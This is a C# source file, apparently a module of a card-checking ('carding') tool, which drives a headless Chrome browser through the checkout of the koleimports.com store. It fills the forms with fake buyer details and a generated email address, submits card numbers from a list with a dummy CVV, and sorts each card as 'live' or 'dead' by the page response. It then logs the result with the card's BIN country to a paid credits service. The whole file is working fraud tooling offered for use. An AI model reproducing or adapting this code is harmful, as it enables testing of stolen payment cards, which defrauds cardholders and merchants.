using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class koleimports
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

            
            if (Thunder._Form1.numcc() > 0 && Variables.run==true)
            {


                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--headless");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.koleimports.com/catalog/category/view/id/1520";
                Thread.Sleep(3000);
                Thunder._Form1.update_progresbar(5);
                var producto = "/html/body/div[2]/div/main/div[2]/div/div/div[2]/ol/li[" + RandomNumber(1, 20) + "]";

                try
                {
                    driver.ExecuteJavaScript("document.querySelector('#ju_overlay').remove();");
                }
                catch (Exception ex)
                {

                    Console.WriteLine(ex.ToString());
                }

                if (IsElementPresent(By.XPath(producto)))
                {

                    try
                    {
                        driver.ExecuteJavaScript("document.querySelector('#ju_overlay').remove();");
                    }
                    catch (Exception ex)
                    {

                        Console.WriteLine(ex.ToString());
                    }

                    driver.FindElement(By.XPath(producto)).Click();
                    Thread.Sleep(3000);
                    Thunder._Form1.update_progresbar(15);
                    driver.ExecuteJavaScript("document.querySelector('body > div.v-modal > div.v-modal-container.in-product-modal > div > div > div.in-details > div.in-box > div > div > button').click()");
                    Thread.Sleep(3000);
                    driver.ExecuteJavaScript("document.querySelector('#app > div > header > div.navigation > div > div > nav > ul.in-links > li:nth-child(4) > div > div > div.bottom > div:nth-child(2) > div > button.v-btn.v-btn-green').click();");
                    Thread.Sleep(2000);
                }

                if (tiempoElemento(By.Id("bolt-checkout-frame")))
                {
                    Thunder._Form1.update_progresbar(30);
                    driver.SwitchTo().Frame(driver.FindElement(By.Id("bolt-checkout-frame")));


                    //driver.SwitchTo().ParentFrame();



                    Thread.Sleep(1000);
                    Thunder._Form1.update_progresbar(50);
                    driver.FindElement(By.Name("fname")).SendKeys("DAVID");
                    driver.FindElement(By.Name("lname")).SendKeys("REYES");
                    driver.FindElement(By.Name("email")).SendKeys(correo);
                    driver.FindElement(By.Name("phone")).SendKeys("2132547896");
                    var pais = new SelectElement(driver.FindElementById("shippingCountry"));
                    pais.SelectByValue("US");
                    Thread.Sleep(600);
                    driver.FindElement(By.Name("notSearchAddrss")).SendKeys("street 643");
                    driver.FindElement(By.Name("ship-city")).SendKeys("New York");
                    driver.FindElement(By.Name("stateSelector")).SendKeys("New York" + Keys.Enter);
                    driver.FindElement(By.Name("ship-zip")).SendKeys("10001" + Keys.Tab);
                    Thread.Sleep(5000);



                    driver.FindElement(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[3]/button")).Click();
                    Thread.Sleep(3000);
                    driver.FindElement(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[3]/button")).Click();

                    if (tiempoElemento(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[2]/button")))
                    {
                        Thunder._Form1.update_progresbar(55);
                        driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[2]/button")).Click();
                        Thread.Sleep(200);
                    }
                    else
                    {
                        restart();
                    }


                }
                else
                {
                    restart();
                }

                if (tiempoElemento(By.Name("cardnumber")))
                {
                    pago();
                }
                else
                {
                    restart();
                }


            }
            else
            {
                stop();
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(2000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
               
                var num = 1;

                if (Thunder._Form1.numcc() > 0 && Variables.run==true)
                {
                    if (pagos < 2)
                    {
                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        Thunder._Form1.update_progresbar(90);
                        driver.ExecuteJavaScript("document.querySelector('#ccn').value=''");
                        Thread.Sleep(500);
                        driver.FindElement(By.Name("cardnumber")).SendKeys(ccLine[0]);
                        Thread.Sleep(500);
                        driver.ExecuteJavaScript("document.querySelector('#exp').value=''");
                        Thread.Sleep(500);
                        driver.ExecuteJavaScript("document.querySelector('#cvv').value=''");
                        Thread.Sleep(500);
                        driver.FindElement(By.Name("notSearchExp")).SendKeys(ccLine[1] + ccLine[2].Remove(0, 2));
                        Thread.Sleep(200);
                        var ccv = "000";

                        if (ccLine[2].Trim().Length == 4)
                        {
                            ccv = "0000";
                        }
                        driver.FindElement(By.Name("cvc")).SendKeys(ccv);

                        Thread.Sleep(1000);

                                                     

                        if (IsElementPresent(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[4]/button")))
                        {
                            driver.FindElement(By.XPath("//*[@id='page']/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[4]/button")).Click();
                        }

                        if (IsElementPresent(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[3]/button")))
                        {
                            driver.FindElement(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[3]/button")).Click();
                        }

                        Thread.Sleep(5000);


                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }

                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                // MessageBox.Show(ex.ToString());
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop();
                }
               
            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                Thunder._Form1.abort();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex);
                Thunder._Form1.abort();
            }
           
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 15)
                {



                    if (IsElementPresent(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[4]/div[1]")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[4]/div[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[1]/div/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[4]/div[1]")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div[8]/div/iframe")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[8]/div/iframe")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[8]/div/iframe")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='maincontent']/div/div/div/h1")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='maincontent']/div/div/div/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='maincontent']/div/div/div/h1")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='sa_header_text']")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='sa_header_text']")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='sa_header_text']")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {


                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
    }
}

